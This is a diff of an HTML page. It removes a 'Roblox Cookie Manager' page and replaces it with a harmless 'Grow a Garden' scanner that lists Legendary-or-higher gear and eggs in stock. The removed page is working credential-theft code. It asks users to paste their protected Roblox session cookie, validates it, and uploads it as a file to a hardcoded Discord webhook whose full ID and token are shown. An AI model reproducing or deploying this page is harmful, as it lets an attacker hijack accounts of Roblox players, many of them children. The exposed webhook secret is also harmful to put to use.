@@ -1,122 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Roblox Cookie Manager</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 700px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 25px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        textarea, input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 2px solid #ddd;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        textarea {
-            height: 150px;
-            font-family: 'Courier New', monospace;
-        }
-        button {
-            background: #3498db;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            cursor: pointer;
-            font-size: 16px;
-            border-radius: 4px;
-            width: 100%;
-            margin: 10px 0;
-        }
-        #result {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 4px;
-            font-weight: bold;
-        }
-        .valid { background: #d5f5e3; color: #27ae60; border-left: 5px solid #2ecc71; }
-        .invalid { background: #fadbd8; color: #e74c3c; border-left: 5px solid #e74c3c; }
-        .sending { background: #fff3cd; color: #f39c12; border-left: 5px solid #f39c12; }
-    </style>
+  <meta charset="UTF-8">
+  <title>Grow a Garden Legendary Scanner</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #1e1e1e;
+      color: #e0e0e0;
+      padding: 20px;
+    }
+    h1 { color: #4CAF50; }
+    .item {
+      padding: 10px;
+      margin: 5px 0;
+      background: #2c2c2c;
+      border-left: 5px solid #4CAF50;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Roblox Cookie Manager</h2>
-        <input id="usernameInput" type="text" placeholder="Roblox Username (optional)">
-        <textarea id="cookieInput" placeholder="Paste _|WARNING:-DO-NOT-SHARE-THIS cookie here"></textarea>
-        <button onclick="processCookie()">Send to Webhook</button>
-        <div id="result">Enter details and click the button</div>
-    </div>
+  <h1>Grow a Garden: Legendary Gear & Egg Scanner</h1>
+  <p>Checking for items with <strong>Legendary</strong> or higher rarity in stock...</p>
+  <div id="results">Loading...</div>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";
+  <script>
+    const API_URL = 'https://growagardenapi.vercel.app/api/stock/GetStock';
 
-        async function processCookie() {
-            const cookie = document.getElementById('cookieInput').value.trim();
-            const username = document.getElementById('usernameInput').value.trim();
-            const resultDiv = document.getElementById('result');
-            
-            // Reset status
-            resultDiv.className = "";
-            resultDiv.textContent = "Processing...";
-            
-            // Validate cookie
-            if (!cookie || !cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS') || cookie.length < 500) {
-                resultDiv.textContent = "❌ Invalid Roblox cookie format";
-                resultDiv.className = "invalid";
-                return;
-            }
+    async function fetchStock() {
+      const res = await fetch(API_URL);
+      const data = await res.json();
+      const resultsDiv = document.getElementById('results');
+      resultsDiv.innerHTML = ''; // Clear old results
 
-            // Prepare the file
-            const cookieFile = new Blob([cookie], { type: 'text/plain' });
-            const formData = new FormData();
-            formData.append('payload_json', JSON.stringify({
-                content: username ? `Cookie from @${username}` : "New cookie submission",
-                embeds: [{
-                    title: "Roblox Cookie Data",
-                    description: "Attached as file for security",
-                    color: 0x3498db,
-                    fields: [
-                        { name: "Username", value: username || "Not provided", inline: true },
-                        { name: "Cookie Length", value: cookie.length.toString(), inline: true }
-                    ]
-                }]
-            }));
-            formData.append('file', cookieFile, 'roblox_cookie.txt');
+      const legendaryItems = [];
+      const rarities = ['Legendary', 'Mythical', 'Divine']; // You can add more if needed
 
-            // Send to webhook
-            try {
-                resultDiv.textContent = "⏳ Sending to Discord...";
-                resultDiv.className = "sending";
-                
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                    resultDiv.textContent = "✅ Success! Check your Discord";
-                    resultDiv.className = "valid";
-                } else {
-                    throw new Error(`Discord responded with ${response.status}`);
-                }
-            } catch (error) {
-                resultDiv.textContent = `❌ Failed to send: ${error.message}`;
-                resultDiv.className = "invalid";
-                console.error("Error:", error);
-            }
+      // Scan Gear
+      data.gear.forEach(item => {
+        if (item.stock > 0 && rarities.includes(item.rarity)) {
+          legendaryItems.push({ ...item, type: 'Gear' });
         }
-    </script>
+      });
+
+      // Scan Eggs
+      data.eggs.forEach(item => {
+        if (item.stock > 0 && rarities.includes(item.rarity)) {
+          legendaryItems.push({ ...item, type: 'Egg' });
+        }
+      });
+
+      if (legendaryItems.length > 0) {
+        legendaryItems.forEach(item => {
+          const div = document.createElement('div');
+          div.className = 'item';
+          div.innerHTML = `
+            <strong>${item.name}</strong> [${item.type}]<br>
+            Rarity: <span style="color: gold;">${item.rarity}</span><br>
+            Stock: ${item.stock}
+          `;
+          resultsDiv.appendChild(div);
+        });
+      } else {
+        resultsDiv.innerHTML = '<p>No Legendary+ gear or eggs in stock right now.</p>';
+      }
+    }
+
+    // Initial load
+    fetchStock();
+
+    // Refresh every 30 seconds
+    setInterval(fetchStock, 30000);
+  </script>
 </body>
 </html>
